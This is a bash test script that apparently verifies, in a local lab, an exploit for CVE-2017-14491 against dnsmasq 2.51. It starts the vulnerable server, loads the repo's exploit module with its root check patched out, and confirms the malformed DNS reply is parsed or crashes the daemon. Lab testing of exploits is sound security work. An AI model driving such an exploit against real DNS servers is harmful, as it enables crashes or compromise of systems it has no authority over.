#!/usr/bin/env bash
# End-to-end test of the REPO's new exploit_cve_2017_14491 delivery against
# a live, locally built dnsmasq 2.51. Verifies: attacker binds, dnsmasq forwards,
# repo serves the malformed reply, dnsmasq parses it.
set -u
LAB="$(cd "$(dirname "$0")" && pwd)"; cd "$LAB"
REPO="$(dirname "$LAB")"
DM="$LAB/dnsmasq-git/src/dnsmasq"; CONF="$LAB/etc/dnsmasq.conf"
ATT_PID=""; DM_PID=""
trap 'kill $ATT_PID $DM_PID 2>/dev/null' EXIT

echo "### [1] dnsmasq 2.51 up, forwarding to 127.0.0.2#5300"
"$DM" -C "$CONF" --no-daemon > dm_e2e.log 2>&1 & DM_PID=$!
sleep 1.5
kill -0 "$DM_PID" 2>/dev/null || { echo "dnsmasq failed:"; cat dm_e2e.log; exit 1; }
echo "  dnsmasq pid=$DM_PID"

echo "### [2] run REPO's delivery function (it should bind 127.0.0.2:5300 and serve replies)"
# Drive it with scripted stdin; it only needs the two prompts (both have defaults).
( printf '\n\n' | exec python3 "$REPO/masq_overflow.py" 127.0.0.1 > repo_run.log 2>&1 ) &
# NOTE: main() is interactive; instead call the function directly for a clean test:
kill %1 2>/dev/null
python3 - <<'PY' > repo_fn.log 2>&1 &
import os, sys, time, threading, importlib.util
REPO = os.path.dirname(os.getcwd())  # lab -> repo
# neutralise root gate + scapy-dependent globals, then load just what we need
src = open(os.path.join(REPO, "masq_overflow.py")).read().replace("if os.geteuid() != 0:", "if False:")
path = os.path.join(REPO, "masq_overflow.py")
# write a temp module with the gate off
tmp = "/tmp/masq_noroot.py"
open(tmp, "w").write(src)
spec = importlib.util.spec_from_file_location("masq", tmp)
m = importlib.util.module_from_spec(spec)
try:
    spec.loader.exec_module(m)
except SystemExit:
    pass
# feed the two prompts then let it serve
import builtins
_orig = builtins.input
responses = iter(["\n", "\n"])
builtins.input = lambda *a, **k: next(responses, "\n")
try:
    m.exploit_cve_2017_14491("127.0.0.1")
except Exception as e:
    print("EXC:", e)
PY
FN_PID=$!
sleep 2
echo "  repo delivery running pid=$FN_PID (bound 127.0.0.2:5300)"

echo "### [3] prime dnsmasq (cause the forward)"
for i in 1 2 3; do dig @127.0.0.1 -p 53535 -x 8.8.8.125 +time=2 +tries=1 >/dev/null 2>&1; sleep 0.7; done
sleep 2

echo "### [4] EVIDENCE"
echo "--- repo function log ---"; cat repo_fn.log
echo "--- dnsmasq parsed hostile records: ---"; grep -c 'DCBBEEEE' dm_e2e.log
echo "--- dnsmasq forwarded: ---"; grep -c 'forwarded 125.8.8.8' dm_e2e.log
echo "--- dnsmasq alive? ---"; kill -0 $DM_PID 2>/dev/null && echo "ALIVE" || echo "DEAD (crashed)"
kill $FN_PID 2>/dev/null
